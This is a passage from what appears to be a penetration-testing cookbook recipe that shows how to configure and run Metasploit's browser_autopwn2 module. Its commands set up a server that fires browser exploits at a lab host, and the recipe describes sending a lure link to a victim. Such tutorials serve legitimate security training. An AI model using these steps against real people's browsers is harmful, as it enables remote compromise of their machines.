    # Using Metasploit''s browser_autpwn2 to attack a client


    Metasploit Framework includes a huge collection of client-side exploits, many
    of them are meant to exploit known vulnerabilities in web browsers and there is
    a module that has the ability to detect the version of browser the client is using
    and picks the best exploit to trigger, this module is `browser_autopwn` or `browser_autopwn2`,
    in its newest version.


    In this recipe, we will set up an attack with `browser_autopwn2` and get it ready
    for a victim to come in.


    ## How to do it...


    1. Start `msfconsole`.


    2. We will use version 2 of Browser Autopwn (BAP2):


    ```

    use auxiliary/server/browser_autopwn2

    ```


    3. Let''s take a look at what configurable options it has:


    ```

    show options

    ```


    ![](index-260_1.png)


    4. We will set our Kali server to receive connections:


    ```

    set SRVHOST 192.168.56.1

    ```


    5. Then, we will create a path `/kittens` for the server to respond to:


    ```

    set URIPATH /kittens

    ```


    6. This module triggers a multitude of exploits, including some for Android; suppose
    we are setting up an attack with PCs and don''t want to depend on the authorization
    of Flash, we will exclude Android and Flash: `set EXCLUDE_PATTERN android|flash`


    241


    ![](index-260_2.png)


    [Technet24.ir](http://technet24.ir)


    *Client-Side Attacks and Social Engineering*


    7. We will also set an advanced option (use `show advanced` to view the full list
    of advanced options) for the module to show us each exploit and be more verbose.


    ```

    set ExploitList true

    set VERBOSE true

    ```


    Advanced options also allow us to choose the payload and its parameters, such
    as `LHOST` and `LPORT`, for each platform (Windows, Unix, and Android).


    8. Now, we are ready to run the exploit:


    ```

    run

    ```


    ![](index-261_1.png)


    If we want to trigger a particular exploit, we may use the Path value after our
    server''s URL; for example, if we want the `firefox_svg_plugin` to trigger, we
    send `http://192.168.56.1/PWrmfJApkwW` to the victim; paths are generated randomly
    each time the module runs.


    9. In a client''s browser, if we go to `http://192.168.56.1/kittens`, we will
    see BAP2 respond immediately and try all fitting exploits, and when it successfully
    executes one, it creates a session in the background:


